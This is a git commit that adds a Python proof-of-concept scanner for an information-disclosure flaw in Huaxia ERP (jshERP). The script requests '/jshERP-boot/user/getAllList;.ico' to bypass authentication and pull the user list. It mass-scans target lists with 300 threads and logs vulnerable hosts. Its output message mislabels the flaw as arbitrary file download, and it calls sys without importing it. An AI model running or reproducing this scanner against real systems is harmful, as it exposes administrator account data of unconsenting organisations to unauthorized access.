ec590b379f0ab87c89c3e2187609047e13d953b8
wyn-lk <cloundside@gmail.com>
2024-07-01 21:09:17 +0800

    Add files via upload

---
+++ POC/华夏ERP管理员信息泄露漏洞/1.py
@@ -0,0 +1,72 @@
+# icon_hash="-1298131932"
+import requests,argparse,time
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings() # 解除警告
+GREEN = '\033[92m'
+RESET = '\033[0m'
+proxies = { 
+       "http": "http://127.0.0.1:8080", 
+       "https": "http://127.0.0.1:8080" 
+       }
+def banner():
+	banner = """
+
+	██████╗██╗  ██╗ ██████╗ ███████╗███████╗███╗   ██╗ ██╗
+██╔════╝██║  ██║██╔═══██╗██╔════╝██╔════╝████╗  ██║███║
+██║     ███████║██║   ██║███████╗█████╗  ██╔██╗ ██║╚██║
+██║     ██╔══██║██║   ██║╚════██║██╔══╝  ██║╚██╗██║ ██║
+╚██████╗██║  ██║╚██████╔╝███████║███████╗██║ ╚████║ ██║
+ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═╝
+                                     info:华夏ERP管理员信息泄露漏洞
+	"""
+	print(banner)
+def poc(target):
+	payload_url = "/jshERP-boot/user/getAllList;.ico"
+	url = target + payload_url
+	headers={
+		'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
+		'Connection': 'close',
+		'Accept': '*/*',
+		'Accept-Language': 'en',
+		'Accept-Encoding': 'gzip'
+	}
+
+	try:
+		res = requests.get(url=target,verify=False)
+		res1 = requests.get(url=url,headers=headers,verify=False)
+		if res.status_code == 200:
+			if res1.status_code == 200 and "loginName" in res1.text:
+		
+				print(f"{GREEN}[+]该url存在任意文件下载漏洞：{target}{RESET}")
+				with open("result.txt","a",encoding="utf-8") as f:
+					f.write(target+"\n")
+			else:
+				print(f"[-]该url不存在任意文件下载漏洞：{target}")
+		else:
+			print(f"该url连接失败：{target}")
+	except:
+		print(f"[*]该url出现错误：{target}")
+
+def main():
+	banner()
+	parser = argparse.ArgumentParser()
+	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
+	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
+	args = parser.parse_args()
+	if args.url and not args.file:
+		poc(args.url)
+	elif args.file and not args.url:
+		url_list = []
+		with open(args.file,"r",encoding="utf-8") as f:
+			for i in f.readlines():
+				url_list.append(i.strip().replace("\n",""))
+		mp = Pool(300)
+		mp.map(poc,url_list)
+		mp.close()
+		mp.join()
+	else:
+		print(f"\n\tUage:python {sys.argv[0]} -h")
+
+
+if __name__ == "__main__":
+	main()
